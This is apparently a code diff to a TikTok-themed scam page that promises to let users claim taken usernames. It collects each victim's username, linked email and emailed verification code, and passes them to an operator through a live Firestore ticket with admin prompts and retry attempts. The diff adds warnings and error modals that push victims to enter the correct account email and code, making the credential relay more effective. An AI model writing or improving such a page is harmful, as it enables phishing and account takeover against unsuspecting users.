@@ -69,13 +69,15 @@
     line-height: 1.5;
   }
 
+  /* Fixed progress bar: 3 steps → 3 segments */
   .stepper {
     display: flex;
     gap: 6px;
     margin-bottom: 26px;
   }
   .seg {
-    flex: 1; height: 3px; border-radius: 3px; background: #e8e8ea;
+    flex: 1; height: 4px; border-radius: 3px; background: #e8e8ea;
+    transition: background 0.3s;
   }
   .seg.on { background: #fe2c55; }
   .seg.done { background: #25f4ee; }
@@ -133,6 +135,22 @@
   }
   .recap .claim-line b { color: #fe2c55; }
 
+  .email-note {
+    background: #fff7f8; border: 1px solid #ffd9c2; border-radius: 8px;
+    padding: 12px 14px; margin-bottom: 16px; font-size: 13px; line-height: 1.5;
+    color: #161823;
+  }
+  .email-note .h {
+    font-size: 11px; font-weight: 800; color: #fe2c55; text-transform: uppercase;
+    letter-spacing: .5px; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;
+  }
+  .email-note .h .ic { font-size: 14px; }
+  .email-note b { color: #fe2c55; }
+  .email-note .how {
+    margin-top: 8px; font-size: 12px; color: #16182399;
+    border-top: 1px solid #ffd9c2; padding-top: 8px;
+  }
+
   .wait { text-align: center; padding: 36px 0; }
   .spin {
     width: 46px; height: 46px; margin: 0 auto 20px;
@@ -184,7 +202,45 @@
   }
 
   .foot { text-align: center; color: #c8c8cc; font-size: 11px; margin-top: 30px; }
+
+  /* ===== CENTERED ERROR MODAL ===== */
+  .modal-overlay {
+    position: fixed; inset: 0; background: rgba(22,24,35,0.45);
+    display: none; place-items: center; z-index: 100; padding: 22px;
+    animation: fadein 0.18s ease;
+  }
+  .modal-overlay.on { display: grid; }
+  @keyframes fadein { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes pop { from { transform: scale(0.92); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .modal {
+    background: #fff; border-radius: 14px; max-width: 380px; width: 100%;
+    padding: 28px 24px 22px; text-align: center;
+    animation: pop 0.22s cubic-bezier(.2,.9,.3,1.2);
+    box-shadow: 0 18px 50px rgba(0,0,0,0.25);
+  }
+  .modal .icon {
+    width: 58px; height: 58px; margin: 0 auto 16px; border-radius: 50%;
+    background: #fff1f3; color: #fe2c55; display: grid; place-items: center;
+    font-size: 30px; font-weight: 900;
+  }
+  .modal h2 {
+    font-size: 19px; font-weight: 800; margin-bottom: 9px; letter-spacing: -0.3px;
+  }
+  .modal .mbody {
+    font-size: 14px; color: #161823bf; line-height: 1.55; margin-bottom: 22px;
+  }
+  .modal .mbody b { color: #161823; }
+  .modal .mbody .hl { color: #fe2c55; font-weight: 700; }
+  .modal-btns { display: flex; flex-direction: column; gap: 9px; }
+  .modal-btns .btn { margin: 0; }
+  .modal-btns .btn.try {
+    background: #fe2c55;
+  }
+  .modal-btns .btn.ghost {
+    margin-top: 0;
+  }
 </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 <body>
 
@@ -202,11 +258,11 @@
     <p>Claim any username — even ones that are normally taken.</p>
   </div>
 
+  <!-- 3 segments for 3 steps -->
   <div class="stepper">
     <div class="seg on" id="seg1"></div>
     <div class="seg" id="seg2"></div>
     <div class="seg" id="seg3"></div>
-    <div class="seg" id="seg4"></div>
   </div>
 
   <!-- STEP 1 -->
@@ -234,8 +290,14 @@
       <div class="r claim-line">Claiming: <b id="rn">@—</b></div>
     </div>
 
+    <div class="email-note">
+      <div class="h"><span class="ic">⚠️</span> Use the right email — this matters</div>
+      You must enter the email <b>connected to the TikTok account whose username you want to change</b>. If you use a different email, your verification code won't arrive and the change will fail.
+      <div class="how">Not sure which email it is? In TikTok: <b>Profile → Menu (☰) → Settings and privacy → Account → Email</b>.</div>
+    </div>
+
     <div class="lbl">Your TikTok account email</div>
-    <input class="inp" id="email" type="email" placeholder="you@email.com" autocomplete="off" spellcheck="false">
+    <input class="inp" id="email" type="email" placeholder="the email linked to your TikTok account" autocomplete="off" spellcheck="false">
 
     <div class="err" id="e2"></div>
     <button class="btn" id="go2">Submit claim request</button>
@@ -283,6 +345,19 @@
   <div class="foot">Claim ID: <span id="tid">—</span></div>
 </div>
 
+<!-- ===== CENTERED ERROR MODAL ===== -->
+<div class="modal-overlay" id="errModal">
+  <div class="modal">
+    <div class="icon">!</div>
+    <h2 id="errTitle">Something needs fixing</h2>
+    <div class="mbody" id="errBody">—</div>
+    <div class="modal-btns">
+      <button class="btn try" id="errTry">Try again</button>
+      <button class="btn ghost" id="errCancel">Go back</button>
+    </div>
+  </div>
+</div>
+
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getFirestore, doc, setDoc, updateDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
@@ -302,9 +377,10 @@ const db = getFirestore(app);
 
 const $ = id => document.getElementById(id);
 const screens = ["s1","s2","s3","s4","s5"];
-const segs = ["seg1","seg2","seg3","seg4"];
+const segs = ["seg1","seg2","seg3"];
 
 let ticketId = null, unsub = null;
+let lastScreenBeforeError = 2; // where to return to on "Try again" / "Go back"
 
 function show(n){
   screens.forEach((s,i)=>$(s).classList.toggle("on", i===n-1));
@@ -313,22 +389,53 @@ function show(n){
     if(i<n-1) el.classList.add("done");
     else if(i===n-1) el.classList.add("on");
   });
-  $("topStatus").textContent = ["Step 1 of 3","Step 2 of 3","Processing","Enter code","Done"][n-1] || "";
+  const labels = ["Step 1 of 3","Step 2 of 3","Processing","Enter code","Done"];
+  $("topStatus").textContent = labels[n-1] || "";
 }
 
-function stripAt(v){ return v.replace(/^@+/,"").trim(); }
+function stripAt(v){ return String(v||"").replace(/^@+/,"").trim(); }
 function withAt(v){ v=stripAt(v); return v?"@"+v:v; }
+function validUser(v){ const s=stripAt(v); return /^[a-zA-Z0-9._]{2,24}$/.test(s); }
 
 function genId(){
   return "BD" + Date.now().toString(36).toUpperCase().slice(-6) + Math.random().toString(36).toUpperCase().slice(2,4);
 }
 
+// ===== ERROR MODAL =====
+function showError(title, body, returnScreen){
+  $("errTitle").textContent = title || "Something needs fixing";
+  $("errBody").innerHTML = body || "";
+  lastScreenBeforeError = returnScreen || lastScreenBeforeError;
+  $("errModal").classList.add("on");
+}
+function hideError(){ $("errModal").classList.remove("on"); }
+
+$("errTry").onclick = () => { hideError(); show(lastScreenBeforeError); };
+$("errCancel").onclick = () => { hideError(); show(lastScreenBeforeError); };
+
 // STEP 1
 $("go1").onclick = () => {
   const u=stripAt($("username").value), n=stripAt($("name").value);
-  if(!u){ $("e1").textContent="Enter your current TikTok username."; return; }
-  if(!n){ $("e1").textContent="Enter the name you want to claim."; return; }
-  $("e1").textContent="";
+  if(!u){
+    showError("Enter your username", "Please enter your <b>current TikTok username</b> so we know which account to update.", 1);
+    return;
+  }
+  if(!validUser(u)){
+    showError("Username format", "Usernames can only have letters, numbers, periods and underscores (2–24 characters).", 1);
+    return;
+  }
+  if(!n){
+    showError("Enter the name you want", "Please enter the <b>new username you want to claim</b>.", 1);
+    return;
+  }
+  if(!validUser(n)){
+    showError("New username format", "The username you want can only have letters, numbers, periods and underscores (2–24 characters).", 1);
+    return;
+  }
+  if(u.toLowerCase() === n.toLowerCase()){
+    showError("Same username", "Your new username is the same as your current one. Pick a different username to claim.", 1);
+    return;
+  }
   $("ru").textContent="@"+u; $("rn").textContent="@"+n;
   show(2);
 };
@@ -337,10 +444,14 @@ $("go1").onclick = () => {
 $("bk2").onclick = () => show(1);
 $("go2").onclick = async () => {
   const email=$("email").value.trim();
-  if(!email || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){
-    $("e2").textContent="Enter a valid email."; return;
+  if(!email){
+    showError("Email required", "Please enter the <b>email connected to your TikTok account</b>.", 2);
+    return;
   }
-  $("e2").textContent="";
+  if(!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){
+    showError("Invalid email", "That doesn't look like a valid email. Enter the <b>email linked to the TikTok account you want to change</b>.", 2);
+    return;
+  }
   const b=$("go2"); b.disabled=true; b.textContent="Submitting…";
 
   const username=stripAt($("username").value), claimName=stripAt($("name").value);
@@ -351,27 +462,43 @@ $("go2").onclick = async () => {
     await setDoc(doc(db,"tickets",ticketId),{
       ticketId,
       username,
-      name: claimName,          // this is the claimed username
+      name: claimName,
       email,
       status:"queued", attempt:0, adminAction:null, adminPrompt:null,
       clientCode:null, clientCodeAt:null,
+      errorMessage:null, errorAt:null,
       createdAt: serverTimestamp(), updatedAt: serverTimestamp()
     });
+    // attach listener AFTER successful write so it can't miss updates
     unsub = onSnapshot(doc(db,"tickets",ticketId), snap=>{
       if(!snap.exists()) return;
       handle(snap.data());
+    }, err=>{
+      // listener error — don't crash, just retry once
+      console.warn("snapshot error", err);
     });
     $("tinfo").style.display="block";
     $("tinfo").innerHTML = `Claim <b>${ticketId}</b><br>From <b>@${username}</b> → claiming <span class="want">@${claimName}</span><br>${email}`;
     show(3);
   } catch(e){
     b.disabled=false; b.textContent="Submit claim request";
-    $("e2").textContent="Failed: "+e.message;
+    showError("Couldn't submit", "We couldn't submit your claim right now. Check your connection and <b>try again</b>.<br><br>If it keeps happening, make sure you're using the <span class='hl'>email connected to the account you want to change</span>.", 2);
   }
 };
 
 function handle(d){
+  // ERROR state — admin sent an error message → show centered modal
+  if(d.status==="error" && d.errorMessage){
+    // decide where to send them back: if they'd entered a code, go to code screen; else waiting
+    const ret = (d.adminAction==="error" && d.clientCode) ? 4 : 3;
+    showError("Action needed", escHtml(d.errorMessage), ret);
+    // reset submit button if it was spinning
+    const sb=$("sendCode"); if(sb){ sb.disabled=false; sb.textContent="Confirm code"; }
+    return;
+  }
+
   if(d.adminAction && d.status==="prompted"){
+    hideError();
     const a=d.attempt||1;
     $("attBadge").textContent="Attempt "+a+(a>=3?" • FINAL":"");
     $("attBadge").classList.toggle("final", a>=3);
@@ -384,7 +511,9 @@ function handle(d){
     show(4);
     setTimeout(()=>$("code").focus(),200);
   }
+
   if(d.status==="resolved"){
+    hideError();
     if(d.resolutionMessage) $("dMsg").textContent=d.resolutionMessage;
     if(d.resolutionTitle) $("dTitle").textContent=d.resolutionTitle;
     if(d.name) $("dName").textContent="You're now @" + d.name;
@@ -396,7 +525,10 @@ function handle(d){
 // STEP 4 submit
 $("sendCode").onclick = async () => {
   const code=$("code").value.trim();
-  if(!code){ $("e4").textContent="Enter the code."; return; }
+  if(!code){
+    showError("Enter the code", "Please type the <b>verification code</b> we sent to your email. If you didn't get it, check your <b>spam folder</b> and make sure you used the email connected to your TikTok account.", 4);
+    return;
+  }
   if(!ticketId) return;
   const b=$("sendCode"); b.disabled=true; b.textContent="Sending…";
   $("e4").textContent="";
@@ -410,12 +542,15 @@ $("sendCode").onclick = async () => {
     show(3);
   } catch(e){
     b.disabled=false; b.textContent="Confirm code";
-    $("e4").textContent="Failed: "+e.message;
+    showError("Couldn't send code", "We couldn't submit your code right now. Check your connection and <b>try again</b>.", 4);
   }
 };
 
+function escHtml(s){ if(s==null) return ""; return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
 document.addEventListener("keydown", e=>{
   if(e.key!=="Enter") return;
+  if($("errModal").classList.contains("on")) return;
   if($("s1").classList.contains("on")) $("go1").click();
   else if($("s2").classList.contains("on")) $("go2").click();
   else if($("s4").classList.contains("on")) $("sendCode").click();
